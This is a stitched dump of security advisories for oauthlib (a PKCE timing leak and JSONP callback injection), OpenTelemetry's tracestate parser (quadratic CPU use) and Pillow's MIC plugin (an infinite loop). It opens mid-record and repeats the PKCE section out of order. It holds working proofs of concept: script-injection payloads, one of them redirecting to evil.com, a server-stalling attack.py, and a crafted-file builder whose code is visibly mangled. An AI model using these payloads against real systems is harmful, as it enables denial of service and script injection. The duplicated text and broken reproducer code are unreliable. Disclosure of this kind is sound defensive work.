Tested locally against oauthlib source (network jitter eliminated to isolate 
pure Python execution time):

| Input | Result | Time (10M iterations) |
|---|---|---|
| Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s |
| 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s |
| **Difference** | | **0.03741s** |

The ~37ms delta over 10M iterations corresponds to nanosecond-level differences 
per call, which are statistically exploitable under controlled conditions.

## Attack Scenario

1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking
2. PKCE blocks token request — attacker lacks `code_verifier`
3. Attacker sends repeated requests to `/token` endpoint measuring response times
4. Using timing oracle, attacker recovers `code_verifier` character by character
5. Attacker obtains Access Token → Account Takeover

> **Note:** Practical exploitability is limited due to the single-use nature of 
> authorization codes and real-world network noise. However, the vulnerable 
> pattern should be corrected as a defense-in-depth measure.

## Recommended Fix

Replace `==` with `hmac.compare_digest()` for constant-time comparison:

cr: Elvin Latifli

- No whitelist of allowed characters
- No escaping or sanitization

A safe JSONP implementation must validate that the callback is a legal JavaScript function name (e.g., matching `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`). Without this, the attacker controls the JavaScript code returned in the response body. This is the standard mitigation used by jQuery, Express.js, Google APIs, and other major JSONP implementations.

**How the injection works:**

An attacker sends a revocation request with a crafted callback value:

```
POST /revoke HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=anything&callback=alert(document.cookie)//
```

The server responds with:

```
alert(document.cookie)//({"error": "invalid_client"});
```

This is syntactically valid JavaScript. `alert(document.cookie)` executes as a statement, and `//` comments out the rest of the line. The attacker has full control over the code that appears before the `//`.

**Execution context and attack surface:**

JSONP works by having a browser load a remote script via `<script src="...">`. The loaded script executes in the origin of the **including page**, not the remote server. This means a `<script src="https://auth.example.com/revoke?token=x&callback=payload">` tag on `evil.com` would execute the payload in `evil.com`'s context, not the auth server's context.

The impact comes from client-side integrations that consume this endpoint as trusted JSONP. If a legitimate OAuth client includes `<script src>` pointed at the revocation endpoint and an attacker can influence the callback value (e.g., via query parameter injection, a reflected value, or a man-in-the-middle downgrade), the attacker controls what code runs in the client application's origin. The authorization server becomes a source of attacker-controlled JavaScript that client applications trust and execute.

Note: the `enable_jsonp` parameter defaults to `False`, so only deployments that explicitly opt in are affected. However, this is a supported, documented library feature, not a debug flag. The client-side library includes `prepare_token_revocation_request()` with an explicit `callback` parameter (`oauthlib/oauth2/rfc6749/parameters.py`, line 174), and the documentation shows JSONP revocation as a use case (`oauthlib/oauth2/rfc6749/clients/base.py`, lines 351-358). The existing test suite tests JSONP callback reflection with a benign value (`test_revocation_endpoint.py`, lines 91-101) but does not test for injection. Deployments that enable JSONP typically do so to support older browsers or cross-origin revocation from JavaScript clients, these are exactly the environments most sensitive to script injection.

### PoC

**Requirements:** Python 3.x with oauthlib installed (`pip install oauthlib`).

```python
from oauthlib.oauth2.rfc6749.endpoints.revocation import RevocationEndpoint
from oauthlib.oauth2.rfc6749.request_validator import RequestValidator


class FailValidator(RequestValidator):
    """Auth fails -> triggers error response path (lines 72-73)."""
    def client_authentication_required(self, request, *a, **kw): return True
    def authenticate_client(self, request, *a, **kw): return False
    def authenticate_client_id(self, client_id, request, *a, **kw): return False


class PassValidator(RequestValidator):
    """Auth passes -> triggers success response path (lines 81-82)."""
    def client_authentication_required(self, request, *a, **kw): return False
    def authenticate_client_id(self, client_id, request, *a, **kw): return True
    def revoke_token(self, token, token_type_hint, request, *a, **kw): pass


payloads = [
    "alert(document.cookie)//",
    "window.location='https://evil.com/'//",
    "eval('malicious')//",
]

# --- Error path (401) ---
print("Error path (enable_jsonp=True, auth fails):")
ep_fail = RevocationEndpoint(FailValidator(), enable_jsonp=True)
for p in payloads:
    h, body, status = ep_fail.create_revocation_response(
        "https://auth.example.com/revoke", http_method="POST",
        body=f"token=x&callback={p}")
    assert p in body, "Payload not reflected"
    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")

# --- Success path (200) ---
print("\nSuccess path (enable_jsonp=True, revocation succeeds):")
ep_pass = RevocationEndpoint(PassValidator(), enable_jsonp=True)
for p in payloads:
    h, body, status = ep_pass.create_revocation_response(
        "https://auth.example.com/revoke", http_method="POST",
        body=f"token=x&callback={p}")
    assert p in body, "Payload not reflected"
    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")

# --- Control (default: enable_jsonp=False) ---
print("\nControl (enable_jsonp=False, default):")
ep_safe = RevocationEndpoint(FailValidator(), enable_jsonp=False)
_, body, status = ep_safe.create_revocation_response(
    "https://auth.example.com/revoke", http_method="POST",
    body="token=x&callback=alert(1)//")
assert "alert" not in body, "Payload should not be present"
print(f"  [{status}] {body}")
print("\nAll assertions passed.")
```

**Expected output:**

```
Error path (enable_jsonp=True, auth fails):
  [401] Content-Type: application/json  Body: alert(document.cookie)//({"error": "invalid_client"});
  [401] Content-Type: application/json  Body: window.location='https://evil.com/'//({"error": "invalid_client"});
  [401] Content-Type: application/json  Body: eval('malicious')//({"error": "invalid_client"});

Success path (enable_jsonp=True, revocation succeeds):
  [200] Content-Type: (none)  Body: alert(document.cookie)//();
  [200] Content-Type: (none)  Body: window.location='https://evil.com/'//();
  [200] Content-Type: (none)  Body: eval('malicious')//();

Control (enable_jsonp=False, default):
  [401] {"error": "invalid_client"}

All assertions passed.
```

Both paths reflect the attacker's payload verbatim into the response body.

### Impact

Any oauthlib-based authorization server that enables JSONP on the revocation endpoint (`enable_jsonp=True`) returns attacker-controlled JavaScript in its response body.

Any page or application that loads this endpoint's response as JSONP and exposes attacker influence over the `callback` parameter will execute attacker-controlled code in its own origin. If a legitimate OAuth client uses JSONP revocation (as documented by oauthlib's client-side API) and an attacker can influence the callback value, the attacker controls what code runs in the client application, including access to the client page's DOM and any data normally accessible to scripts running in that origin.

The JSONP feature is intended for legacy cross-origin browser support. Deployments that need it are typically JavaScript-heavy clients, exactly the environment most sensitive to script injection.

**Affected versions:** oauthlib >= 0.6.1 through 3.3.1 (current) and master. The unsanitized callback has been present since the revocation endpoint was first introduced in 2013 (commit `da775de`). The `enable_jsonp` gate was added in 2014 (commit `b85f89a`) but no validation of the callback value was ever added.

### Suggested fix

Validate the `callback` parameter against a strict pattern for legal JavaScript identifiers before using it in the response. Reject or ignore values that do not match:

```python
import re

# Only allow safe JSONP callback names: valid JS identifiers, optionally dot-separated
JSONP_CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*(\.[a-zA-Z_$][a-zA-Z0-9_$]*)*$')

# In create_revocation_response(), before using request.callback:
if self.enable_jsonp and request.callback:
    if not JSONP_CALLBACK_PATTERN.match(request.callback):
        request.callback = None
```

This is the standard mitigation for JSONP callback injection and is the approach used by jQuery, Express.js, and Google APIs. It ensures only syntactically valid function names like `package.hello_world` are accepted, while blocking payloads like `alert(document.cookie)//`.

As a secondary hardening measure, when JSONP is enabled, the response should set `Content-Type: application/javascript` (not `application/json` or empty) to ensure correct browser handling. Currently the success path returns no Content-Type at all, and the error path returns `application/json`.

Alternatively, if JSONP is no longer considered a necessary feature, consider deprecating and removing the `enable_jsonp` option entirely. CORS is now supported by all modern browsers and is the standard mechanism for cross-origin API access.
vulnerabilities.summary: Oauthlib : Unsafe JSONP callback injection in RevocationEndpoint allows arbitrary JavaScript response generation

## Summary

A timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation 
of the Authorization Code Grant flow. The `code_challenge_method_plain` function 
uses Python's standard `==` operator for string comparison instead of a 
constant-time comparison function, potentially allowing timing-based attacks.

## Affected Component

- File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py`
- Functions: `code_challenge_method_plain`, `code_challenge_method_s256`
- Vulnerability Type: CWE-208 (Observable Timing Discrepancy)

## Technical Details

Python's `==` operator uses short-circuit evaluation when comparing strings:
1. Returns `False` immediately if lengths differ
2. Compares characters left-to-right, stopping at first mismatch

This means comparison time varies linearly with the length of the common prefix 
between the attacker-supplied verifier and the stored challenge, creating a 
measurable timing oracle.

## Proof of Concept

Tested locally against oauthlib source (network jitter eliminated to isolate 
pure Python execution time):

| Input | Result | Time (10M iterations) |
|---|---|---|
| Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s |
| 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s |
| **Difference** | | **0.03741s** |

The ~37ms delta over 10M iterations corresponds to nanosecond-level differences 
per call, which are statistically exploitable under controlled conditions.

## Attack Scenario

1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking
2. PKCE blocks token request — attacker lacks `code_verifier`
3. Attacker sends repeated requests to `/token` endpoint measuring response times
4. Using timing oracle, attacker recovers `code_verifier` character by character
5. Attacker obtains Access Token → Account Takeover

> **Note:** Practical exploitability is limited due to the single-use nature of 
> authorization codes and real-world network noise. However, the vulnerable 
> pattern should be corrected as a defense-in-depth measure.

## Recommended Fix

Replace `==` with `hmac.compare_digest()` for constant-time comparison:

cr: Elvin Latifli

vulnerabilities.details:
## Summary
`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.

## Affected component / version
- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).
- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.
- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.

## Details

1. The header reaches the parser without any length check:

```python
# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57
tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size
if tracestate_headers is None:
    tracestate = None
else:
    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)
```

2. The split pattern and the parser:
```python
# opentelemetry-api/src/opentelemetry/trace/span.py:45
_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split
_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*

# span.py:382
@classmethod
def from_header(cls, header_list: list[str]) -> TraceState:
    pairs = {}  # type: dict[str, str]
    for header in header_list:
        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"
        for member in members:
            if not member:
                continue
            match = _member_pattern.fullmatch(member)
            if not match:
                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)
                    "Member doesn't match the w3c identifiers format %s",
                    member,
                )
                return cls()
            ...
```

`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.

3. The sibling propagator already has the missing guard:
```python
# baggage/propagation/__init__.py:68
_MAX_HEADER_LENGTH = 8192
...
if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent
    _logger.warning(...)
    return context
```

A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.
Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). 

Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.

## Proof of concept

### A. Show the quadratic cost (no server needed)

1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).
2. Save as `poc_tracestate.py`:
```python
import logging
import time

from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator

# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.
logging.disable(logging.CRITICAL)

TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"
propagator = TraceContextTextMapPropagator()

previous = None
for n in (10_000, 20_000, 40_000, 80_000):
    # N spaces after a valid member, no comma anywhere in the header
    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}
    start = time.perf_counter()
    propagator.extract(carrier)
    elapsed = time.perf_counter() - start
    growth = f"x{elapsed / previous:.1f}" if previous else "-"
    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")
    previous = elapsed
```
3. Run `python poc_tracestate.py`.
4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:
```
  10000 characters    0.06 s  growth when size doubles: -
  20000 characters    0.26 s  growth when size doubles: x4.0
  40000 characters    1.04 s  growth when size doubles: x4.0
  80000 characters    4.13 s  growth when size doubles: x4.0
```
Replace `" "` with `"\t"` to see ≈1.6× longer.

### B. Show that one request stalls a real server
This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).

1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`.
2. Save as `app.py`:
```python
from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware


async def app(scope, receive, send):
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"ok"})


app = OpenTelemetryMiddleware(app)
```
3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`
4. Save as `attack.py`:
```python
"""Send one oversized tracestate request and, while it is being handled,
measure how long an unrelated request to the same server has to wait."""
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 8000
N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000
TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"


def get(path, extra=""):
    s = socket.create_connection((HOST, PORT), timeout=120)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n{extra}\r\n".encode())
    start, data = time.perf_counter(), b""
    while chunk := s.recv(65536):
        data += chunk
    return time.perf_counter() - start, data.split(b"\r\n")[0].decode()


result = {}
extra = f"traceparent: {TRACEPARENT}\r\ntracestate: a=b{' ' * N}x\r\n"
attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra)))
print("idle /ping:               %.3f s  %s" % get("/ping"))
attacker.start()
time.sleep(0.5)  # let the attack request reach the server first
print("/ping during the attack:  %.3f s  %s" % get("/ping"))
attacker.join()
print("attack request itself:    %.3f s  %s" % result["a"])
```
5. In a second terminal run `python attack.py 100000`.
6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:
```
idle /ping:               0.000 s  HTTP/1.1 200 OK
/ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked)
attack request itself:    6.408 s  HTTP/1.1 200 OK
```
7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.

## Severity
**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.

**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.

**Severity: Medium.**

## Suggested remediation
Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:
```diff
--- a/opentelemetry-api/src/opentelemetry/trace/span.py
+++ b/opentelemetry-api/src/opentelemetry/trace/span.py
@@ def from_header(cls, header_list: list[str]) -> TraceState:
         for header in header_list:
-            members: list[str] = re.split(_delimiter_pattern, header)
+            members: list[str] = [m.strip(" \t") for m in header.split(",")]
```
`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.

## Credit

Discovered and reported by SecDim Security Research
secdim.com | @secdim | security@secdim.com

---

**FROM MAINTAINERS**

## Summary

`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.

Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.

## Impact

Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.

The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.

Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

## Patches

Versions of `opentelemetry-api` up to and including `1.45.0` are affected.

Upgrade `opentelemetry-api` to version `1.45.1` or later.

Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.

## Workarounds

Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.
vulnerabilities.summary: OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api

vulnerabilities.details:
``` ============================================================================ Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. This is the same class of tiny-file, pure-Python non-termination as CVE-2021-28676 (FLI) and CVE-2021-28677 (EPS), and like CVE-2019-19911 (FPX) it depends on `olefile`; it differs in not being reached by the default open/load path. The regression was introduced in `0b33a87b0d15` ("Replaced property methods for n_frames and is_animated with normal properties", 2020-04-13), first released in 7.2.0, which replaced `MicImageFile`'s own `n_frames` property with the `_n_frames` attribute that `TiffImageFile._open` overwrites. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (with `olefile`, which is what registers the MIC plugin). It builds every input in code, writes each one to a temporary file named `x` with no extension (so Pillow identifies the format from its magic bytes), and opens it in a child Python process that runs `Image.open(path)` and prints `im.format` and `im.n_frames`. It builds two things in code: - `tiff(n)`: an `n`-page TIFF of 4×4 greyscale frames written by Pillow itself (`save_all=True`), so the IFDs are chained exactly as Pillow's own writer chains them. The last next-IFD pointer is 0. - `mic(stream)`: a minimal OLE2 compound file with a storage named `img0.ACI` that contains a stream named `Image`, which is the layout `MicImageFile._open` looks for. Sector 0 is the FAT and sector 1 is the directory. The stream starts at sector 2 and is padded to 4096 bytes, so the file doesn't need a mini-FAT. The result is 5632 bytes. It runs three inputs, each in its own child process with a hard 20-second kill: 1. control: the plain 3-page TIFF. Expected `TIFF n_frames = 3`. 2. control: a MIC wrapping a 1-page TIFF. Expected `MIC n_frames = 1`. 3. attack: the same MIC container wrapping the 3-page TIFF. The timeout is enforced by killing the child rather than by an in-process alarm, because a `TimeoutError` raised while `ImageFileDirectory_v2.load()` is parsing would be caught by its `except OSError` (`TiffImagePlugin.py:958`) and leave the IFD half-parsed instead of stopping the loop. The script prints `BUG` when both controls return and the attack child is still running after 20 seconds; otherwise it prints `OK`. With the attached patch applied, the attack case prints `MIC n_frames = 1` and the script prints `OK`. ## Suggested fix The attached patch restores the OLE-level frame count after the embedded TIFF stream has been opened, so the inherited `n_frames` never enters its IFD-walking loop and `n_frames`/`seek()` agree on what a frame is. In `MicImageFile.seek`, `src/PIL/MicImagePlugin.py:82`, right after `TiffImagePlugin.TiffImageFile._open(self)`: ```diff TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame ``` Doing this in `seek()` restores the invariant on every seek, not only the first. The existing assignments at lines 69–70 of `_open` are kept: the initial `seek(0)` → `_seek_check(0)` reads `n_frames` before `TiffImageFile._open` has run, so they are still needed. Plain read-only `n_frames`/`is_animated` properties, as before 0b33a87b0, are no longer a drop-in option because `TiffImageFile._seek` assigns `self.is_animated`. With the patch applied to a clean tree and rebuilt, the attack file returns `n_frames == 1` immediately, a 2-IFD stream raises `EOFError` on `seek(1)` instead of `IndexError`, `save_all=True` to TIFF and PDF completes, and `Tests/test_file_mic.py` and `Tests/test_file_tiff.py` pass. No regression test is included, since one would need a new binary MIC fixture in `Tests/images`. The patch passed that check but has not been reviewed beyond it as the final form of the fix. Two things it leaves alone: it does not add the `_im` reset that `TiffImageFile.seek` performs after `_seek` (`TiffImagePlugin.py:1229`), which matters when switching between OLE streams of different size or mode; and `TiffImageFile.n_frames` still advances via the overridable `tell()` rather than its private `__frame`, so making it iterate on `__frame` would protect any other subclass that redefines `tell()`. ## The patch Restore the OLE stream frame count in MicImageFile.seek() after TiffImageFile._open() resets it, so n_frames cannot loop forever Applies to `src/PIL/MicImagePlugin.py` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix. ```diff diff --git a/src/PIL/MicImagePlugin.py b/src/PIL/MicImagePlugin.py index f8cf3a76f..2bb0109ce 100644 --- a/src/PIL/MicImagePlugin.py +++ b/src/PIL/MicImagePlugin.py @@ -81,6 +81,11 @@ class MicImageFile(TiffImagePlugin.TiffImageFile): TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame def tell(self) -> int: ``` ## The reproducer
Reproducer — repro, 2,330 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # MicImageFile inherits TiffImageFile.n_frames, whose loop `self._seek(self.tell()+1)` # relies on tell() advancing; MicImageFile.tell() returns the OLE stream index (constant), # so a MIC file whose Image stream is a TIFF with >=3 chained IFDs makes im.n_frames spin forever. import io, struct, subprocess, sys, tempfile, os from PIL import Image def tiff(n): # n-page TIFF written by Pillow itself b = io.BytesIO(); fr = [Image.new("L", (4, 4), i) for i in range(n)] fr[0].save(b, "TIFF", save_all=True, append_images=fr[1:]); return b.getvalue() def mic(stream): # minimal OLE2 file: storage "img0.ACI" containing stream "Image" END, FREE, FATSECT = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD data = stream.ljust(4096, b"\0"); n = len(data) // 512 fat = [FATSECT, END] + [3 + k for k in range(n - 1)] + [END]; fat += [FREE] * (128 - len(fat)) def entry(name, kind, child, start, size): raw = name.encode("utf-16-le") + b"\0\0" return raw.ljust(64, b"\0") + struct.pack(" {out}"); return hung c1 = run("control: 3-page TIFF, direct", tiff(3)) c2 = run("control: MIC around 1-page TIFF", mic(tiff(1))) bug = run("attack: MIC around 3-page TIFF", mic(tiff(3))) print("BUG" if bug and not c1 and not c2 else "OK") ```
---
